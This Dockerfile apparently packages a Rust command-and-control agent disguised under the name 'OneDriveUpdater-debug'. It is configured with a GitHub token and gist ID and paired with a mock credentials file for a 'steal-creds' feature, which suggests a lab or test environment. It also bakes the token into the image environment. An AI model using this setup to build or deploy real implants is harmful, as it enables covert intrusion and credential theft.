# Build stage - use nightly for edition2024 support
FROM rustlang/rust:nightly-slim AS builder

RUN apt-get update && apt-get install -y pkg-config libssl-dev && rm -rf /var/lib/apt/lists/*

WORKDIR /usr/src/app
COPY . .

ARG GITHUB_TOKEN
ARG GIST_ID
ENV GITHUB_TOKEN=$GITHUB_TOKEN
ENV GIST_ID=$GIST_ID

RUN cargo build --release

# Runtime stage - use same base as builder for GLIBC compatibility
FROM rustlang/rust:nightly-slim

RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY --from=builder /usr/src/app/target/release/OneDriveUpdater-debug /app/c2_agent

# Place mock credentials file on the "Desktop" for the steal-creds feature
RUN mkdir -p /root/Desktop
COPY mock_logins.json /root/Desktop/mock_logins.json

CMD ["./c2_agent"]
